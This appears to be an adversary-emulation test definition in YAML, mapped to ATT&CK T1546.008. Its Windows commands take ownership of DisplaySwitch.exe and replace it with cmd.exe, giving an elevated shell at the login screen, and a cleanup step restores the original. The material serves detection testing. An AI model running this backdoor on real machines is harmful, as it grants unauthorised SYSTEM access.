- id: 4488c1e2-3e16-564f-85d2-3298ffb834a7
  name: Soumaia ART Tests - Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe
  description: Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe. This allows the user to launch an elevated command prompt by pressing the Windows Key + P on the login screen. (requires elevation)
  tactic: privilege-escalation
  technique:
    attack_id: T1546.008
    name: 'Event Triggered Execution: Accessibility Features'
  platforms:
    windows:
      cmd:
        command: |-
          IF NOT EXIST C:\Windows\System32\DisplaySwitch_backup.exe (copy C:\Windows\System32\DisplaySwitch.exe C:\Windows\System32\DisplaySwitch_backup.exe) ELSE ( pushd )
          takeown /F C:\Windows\System32\DisplaySwitch.exe /A
          icacls C:\Windows\System32\DisplaySwitch.exe /grant Administrators:F /t
          copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\DisplaySwitch.exe
        cleanup: |-
          copy /Y C:\Windows\System32\DisplaySwitch_backup.exe C:\Windows\System32\DisplaySwitch.exe
